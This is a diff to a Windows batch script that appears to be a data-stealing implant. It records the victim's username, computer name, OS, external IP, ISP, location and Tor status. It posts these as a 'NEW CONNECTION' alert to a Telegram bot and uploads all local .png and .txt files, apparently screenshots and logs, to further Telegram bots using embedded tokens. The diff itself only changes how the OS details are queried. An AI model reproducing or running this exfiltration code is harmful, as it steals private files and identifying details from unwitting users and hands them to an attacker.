@@ -28,12 +28,12 @@ echo      =================== >> "%AppData%\Microsoft\Windows\Templates\%usernam
 "%appdata%\Ookla\Speedtest CLI\speedtest.exe" >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
 echo      =================== >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
 
-for /f "tokens=1* delims=: " %%A in (
-  'powershell Get-ComputerInfo 2^>NUL^|find "OsName                                                  :"'
-) Do set OsName=%%B
-for /f "tokens=1* delims=: " %%A in (
-  'powershell Get-ComputerInfo 2^>NUL^|find "OsArchitecture                                          :"'
-) Do set OsArchitecture=%%B
+for /f "tokens=2 delims==" %%G in ('wmic os get Caption /value') do ( 
+    set WinEdition=%%G
+    )
+for /f "tokens=2 delims==" %%G in ('wmic os get OSArchitecture /value') do ( 
+    set OSArchitecture=%%G
+    )
 for /f "tokens=*" %%A in (
   'curl ipinfo.io/ip'
 ) Do set ExtIP=%%A
@@ -53,7 +53,7 @@ for /f "tokens=1* delims=: " %%A in (
   'curl %proxy% https://iplist.cc/api 2^>NUL^|find "tor"'
 ) Do set TorStatus=%%B
 
-curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%OsName% %OsArchitecture%] [%ISP% (%ExtIP%), Tor is enabled: %TorStatus%] [%City% (%Region%, %Country%)] " https://api.telegram.org/bot2069537898:AAEpaEeE32SSpft-gQ97Onau02dbQ6ZY2Ss/sendMessage?chat_id=-1001589929429
+curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%), Tor is enabled: %TorStatus%] [%City% (%Region%, %Country%)] " https://api.telegram.org/bot2069537898:AAEpaEeE32SSpft-gQ97Onau02dbQ6ZY2Ss/sendMessage?chat_id=-1001589929429
 for %%# in ("*.png") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot1951761743:AAF3jkN_H27jkxlyUVx-suQChNmEnAS82Ns/sendDocument?chat_id=-1001585587948 -k --insecure
 for %%# in ("*.txt") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot2008957838:AAHp_ojoUjJwh2Y0EDHWyN-pUYRAyiaMPws/sendDocument?chat_id=-1001548046257 -k --insecure
 
